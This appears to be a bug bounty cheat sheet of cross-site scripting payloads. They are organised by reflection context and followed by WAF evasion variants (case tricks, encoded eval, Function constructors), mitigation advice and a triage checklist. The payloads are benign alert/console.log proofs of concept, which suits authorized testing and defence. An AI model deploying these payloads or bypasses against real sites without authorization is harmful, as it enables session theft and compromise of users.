# 📁 Cross-Site Scripting (XSS) — Basic & Advanced Payload Cheat Sheet

*Contributed by Cyber_Spy.404 | Educational Bug Bounty Series*

> **Scope and ethics:** This cheat sheet is provided for authorized penetration testing, bug bounty verification, and defensive web filter evaluation. Use strictly safe proof-of-concept indicators (such as `alert(document.domain)` or `console.log(1)`). Never execute unauthorized actions or harvest sensitive data.

---

## 📌 Executive Summary

Modern web application firewalls (WAFs) and input sanitizers frequently block simple `<script>` tags while failing to inspect alternate HTML5 elements, vector graphics (SVG), event handlers, and character encodings.

This cheat sheet organizes verified, non-destructive XSS payloads across specific reflection contexts and WAF evasion scenarios.

---

## 📋 Comprehensive Context Cheat Sheet

### 1. Standard HTML Elements (Tag Injection)
When user input reflects directly between HTML tags where angle brackets (`<`, `>`) are unencoded:

```html
<!-- Classic Script Tag -->
<script>alert(document.domain)</script>

<!-- Script Tag with Type -->
<script type="text/javascript">alert(document.domain)</script>

<!-- Embedded SVG Vector -->
<svg onload="alert(document.domain)"></svg>

<!-- Audio / Video Event Trigger -->
<audio src="x" onerror="alert(document.domain)"></audio>
<video src="x" onerror="alert(document.domain)"></video>

<!-- Details / Ontoggle (Requires no user interaction in modern engines) -->
<details open ontoggle="alert(document.domain)">Test</details>

<!-- Marquee Element (Legacy engines) -->
<marquee onstart="alert(document.domain)"></marquee>

<!-- Object Element (Loads data URI) -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+"></object>
```

---

### 2. Event Handler Payloads (Without `<script>`)
When `<script>` is explicitly blacklisted by a filter or WAF:

```html
<!-- Image Element with Error Handler -->
<img src="invalid-image.jpg" onerror="alert(document.domain)">

<!-- Body Tag with Load Event -->
<body onload="alert(document.domain)">

<!-- Input Tag with Autofocus & Focus Event -->
<input type="text" autofocus onfocus="alert(document.domain)">

<!-- Select Element with Focus Event -->
<select autofocus onfocus="alert(document.domain)"></select>

<!-- TextArea with Focus Event -->
<textarea autofocus onfocus="alert(document.domain)"></textarea>

<!-- Keygen Element -->
<keygen autofocus onfocus="alert(document.domain)">
```

---

### 3. Attribute Context Breakouts
When user input reflects inside an existing tag attribute:
*Example:* `<input type="text" value="[INPUT]">`

```html
<!-- Double Quote Breakout with Event Handler -->
" onfocus="alert(document.domain)" autofocus="

<!-- Single Quote Breakout -->
' onfocus='alert(document.domain)' autofocus='

<!-- Tag Closure Breakout -->
"><script>alert(document.domain)</script>
'><script>alert(document.domain)</script>

<!-- Attribute Injection (Without closing quotes if unquoted) -->
onmouseover=alert(document.domain)
```

---

### 4. JavaScript Execution Context
When input reflects inside an inline `<script>` block:
*Example:* `var search = "[INPUT]";`

```javascript
// Quote and Semicolon Breakout
";alert(document.domain);//
';alert(document.domain);//

// Arithmetic Operator Breakout
"-alert(document.domain)-"
'-alert(document.domain)-'

// Complete Tag Closure (Bypasses string escaping in most browsers)
</script><script>alert(document.domain)</script>

// Template Literal Breakout (ES6 Backticks: `Hello ${...}`)
${alert(document.domain)}
```

---

### 5. Hyperlink & Action URL Context
When input reflects inside an `href`, `src`, `action`, or `formaction` attribute:
*Example:* `<a href="[INPUT]">Click here</a>`

```html
<!-- Standard Javascript Pseudo-Protocol -->
javascript:alert(document.domain)

<!-- URL-Encoded Javascript Protocol -->
javascript:%61%6c%65%72%74(document.domain)

<!-- Case Variation -->
JaVaScRiPt:alert(document.domain)

<!-- Prepending Whitespace or Control Characters -->
javascript:/*--></title></style></textarea>*/<script>alert(document.domain)</script>

<!-- Formaction Attribute on Submit Button -->
<button formaction="javascript:alert(document.domain)">Click Me</button>
```

---

## 🛡️ WAF & Filter Evasion Payloads

When an intermediate WAF (Cloudflare, Akamai, AWS WAF, ModSecurity) inspects incoming requests:

### 1. Case Manipulation
```html
<sCrIpt>alert(document.domain)</sCrIpt>
<iMg sRc=x oNeRrOr=alert(document.domain)>
<SvG oNlOaD=alert(document.domain)>
```

### 2. Space Character Alternatives
When spaces (` `) are stripped or trigger WAF rules, substitute forward slashes (`/`), tabs (`%09`), or carriage returns (`%0d`):
```html
<img/src=x/onerror=alert(document.domain)>
<svg/onload=alert(document.domain)>
<iframe/src="javascript:alert(document.domain)"></iframe>
```

### 3. Obfuscation of `alert` Keyword
When the literal string `alert` is blocked:
```javascript
// Window index access
window['alert'](document.domain)

// Base64 decoding with eval
eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))

// Constructor of anonymous function
Function('alert(document.domain)')()

// String concatenation
window['al'+'ert'](document.domain)

// Prompt / Confirm alternatives
confirm(document.domain)
prompt(document.domain)
console.log(document.domain)
```

### 4. Throw / Catch Exception Handling
```html
<img src=x onerror="try{throw document.domain}catch(e){alert(e)}">
```

---

## 🛠️ Safe Educational Verification Template

### Safe HTTP Testing Request
```http
POST /api/v1/comments HTTP/1.1
Host: example.com
Authorization: Bearer [CONTROLLED_TEST_TOKEN]
Content-Type: application/json

{
  "comment": "<img src=x onerror=console.log(document.domain)>"
}
```

### Clean Verification Output
In DevTools Console:
```text
example.com
```

---

## 🛡️ Mitigation & Remediation Guidelines

1. **Context-Aware Encoding:** Encode data according to destination context (HTML Body, Attribute, JavaScript, CSS, URL).
2. **Use Modern Frameworks:** Modern frameworks (React, Angular, Vue, Svelte) automatically escape values bound via JSX / templates (e.g. `{userInput}`). Avoid dangerous escape hatches like `dangerouslySetInnerHTML`.
3. **HTML Sanitization:** Sanitize user-submitted rich text with **DOMPurify**:
   ```javascript
   const clean = DOMPurify.sanitize(dirty, { USE_PROFILES: { html: true } });
   ```
4. **Deploy Strict CSP:** Block inline scripts and restrict script origins.

---

## ✅ Bug Bounty Triage Checklist

- [ ] Identified exact context (HTML body, attribute, script tag, URL).
- [ ] Confirmed payload execution in at least two modern browsers (Chrome, Firefox).
- [ ] Kept payload non-destructive (`alert(document.domain)` or `console.log`).
- [ ] Captured clear screenshots showing executing alert box with target domain clearly visible.
- [ ] Provided remediation recommendations targeting root-cause context encoding.
